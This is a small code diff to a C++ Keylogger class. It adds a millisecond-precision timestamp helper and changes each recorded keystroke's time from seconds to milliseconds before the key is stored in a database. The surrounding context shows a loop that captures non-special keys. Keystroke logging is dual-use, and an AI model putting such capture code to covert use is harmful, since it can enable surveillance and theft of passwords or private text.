@@ -8,6 +8,13 @@
 #include <iostream>
 #include <fstream>
 #include <thread>
+#include <chrono>
+
+uint64_t timeSinceEpochMillisec() 
+{
+    using namespace std::chrono;
+    return duration_cast<milliseconds>(system_clock::now().time_since_epoch()).count();
+}
 
 void Keylogger::start(Database db)
 {
@@ -23,7 +30,7 @@ void Keylogger::start(Database db)
             {
                 if (SpecialKeys(KEY) == false)
                 {
-                    std::time_t time = std::time(0);
+                    uint64_t time = timeSinceEpochMillisec();
                     m_db.insertKey("keyboard", time, KEY);
                 }
             }
